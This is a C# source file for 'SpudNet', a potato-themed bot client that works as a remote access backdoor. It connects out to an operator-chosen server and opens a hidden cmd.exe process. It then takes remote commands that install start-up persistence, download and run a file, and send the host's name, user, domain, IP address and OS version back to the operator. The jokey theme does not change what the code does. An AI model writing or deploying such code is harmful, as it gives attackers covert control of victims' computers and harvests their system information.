using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Windows.Forms;
using Figgle;

namespace SpudBot
{
    class SpudNet
    {
        public static void Connect(String server, int port)
        {
            try
            {
                TcpClient SpudNet = new TcpClient(server, port);

                Process SpudCommand = new Process();
                SpudCommand.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                SpudCommand.StartInfo.FileName = "cmd.exe";

                string help = "\n\n - help                Print out a list of commands.\n - background          Spudify the Desktop Background.\n - calc                Count Potatoes with Calculator.\n - fact                Send LilSpud a random Spudfact.\n - music               Play LilSpud's favorite song.\n - persistance	       Launch SpudNet on start-up.\n - search              Find Potatoes Near LilSpud.\n - status              Report the status of LilSpud.\n - video               Teach LilSpud how to make a Tasty Potato.\n - whoami              Query System Information.\n - exit                Terminate the Current Session.\n\n";

                Byte[] data = System.Text.Encoding.ASCII.GetBytes(FiggleFonts.Standard.Render("Spudnet") + "\nA LilSpud has connected ... \nInteract with LilSpud using the following Commands:" + help);

                NetworkStream stream = SpudNet.GetStream();

                stream.Write(data, 0, data.Length);

                String responseData = String.Empty;

                bool endSession = false;

                while (endSession != true)
                {
                    data = new Byte[256];

                    Int32 bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    Console.WriteLine("Received: {0}", responseData);

                    switch(responseData)
                    {
                        case "help\n":
                            data = System.Text.Encoding.ASCII.GetBytes(help);
                            stream.Write(data, 0, data.Length);
                            break;
                        case "background\n":
                            SpudWallpaper.SetWallpaper();
                            break;
                        case "calc\n":
                            SpudCommand.StartInfo.Arguments = "/c calc.exe";
                            SpudCommand.Start();
                            break;
                        case "fact\n":
                            SpudFact.DisplaySpudFact();
                            break;
                        case "music\n":
                            SpudMusic.PlayMusic();
                            break;
                        case "persistance\n":
                            var status = SpudOnStartup.PersistanceSpud(server, port);
                            break;
                        case "status\n":
                            data = System.Text.Encoding.ASCII.GetBytes("LilSpud is still connected ...\n\n");
                            stream.Write(data, 0, data.Length);
                            break;
                        case "search\n":
                            SpudSearch.Google();
                            break;
                        case "video\n":
                            string playVideo = SpudDownload.Download();
                            SpudCommand.StartInfo.Arguments = playVideo;
                            SpudCommand.Start();
                            break;                          
                        case "whoami\n":
                            var (hostname, username, domain, address, version) = SpudFinder.GetInfo();
                            Byte[] systeminfo = System.Text.Encoding.ASCII.GetBytes(String.Format("Hostname: {0}\nUserName: {1}\nDomain: {2}\nIP Address: {3}\nOS: {4}\n", hostname, username, domain, address, version));
                            stream.Write(systeminfo, 0, systeminfo.Length);
                            break;
                        case "exit\n":
                            endSession = true;
                            break;
                        default:
                            data = System.Text.Encoding.ASCII.GetBytes("Use 'help' to print out a list of commands ...\n\n");
                            stream.Write(data, 0, data.Length);
                            break;
                    }
                }
                stream.Close();
                SpudNet.Close();
                Application.Exit();
            }            
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
        }
    }
}
